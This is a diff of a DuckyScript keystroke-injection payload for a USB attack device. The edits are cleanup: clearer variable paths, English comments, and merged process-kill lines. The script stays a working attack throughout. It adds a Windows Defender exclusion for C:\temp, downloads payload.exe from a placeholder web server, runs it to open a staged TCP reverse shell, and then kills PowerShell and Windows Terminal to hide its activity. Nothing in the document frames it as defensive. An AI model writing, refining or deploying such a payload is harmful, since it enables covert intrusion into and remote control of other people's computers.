@@ -23,31 +23,26 @@ DELAY 1000
 REM |===Import variables===|
 STRING $dir = "C:\temp" 
 ENTER
-STRING $shell = "C:\temp\shell.exe" 
+STRING $shell = "$dir\shell.exe" 
 ENTER
 DELAY 250
 
-REM |===Add path exclusion MS Defender===|
+REM |===Add path exclusion to Windows Defender===|
 STRING Add-MpPreference -ExclusionPath $dir
 ENTER
 DELAY 750
 
-REM |===Download shell executable van Webserver===|
-STRING New-Item -Path $dir -ItemType Directory
-ENTER
-DELAY 350
-STRING Invoke-WebRequest -uri http://yourwebserver/payload.exe -outfile $shell
+REM |===Download shell executable from Webserver===|
+STRING Invoke-WebRequest -Uri http://yourwebserver/payload.exe -OutFile $shell
 ENTER
 DELAY 750
 
 REM |===Run .exe and set up Staged TCP reverse shell===|
-STRING start $shell
+STRING Start-Process $shell
 ENTER
 DELAY 750
 
 REM |===Kill all active wt or powershell processes (Visibility)===|
-STRING Stop-Process -name powershell
+STRING Stop-Process -Name powershell, WindowsTerminal
 ENTER
 DELAY 500
-STRING Stop-Process -name WindowsTerminal
-ENTER
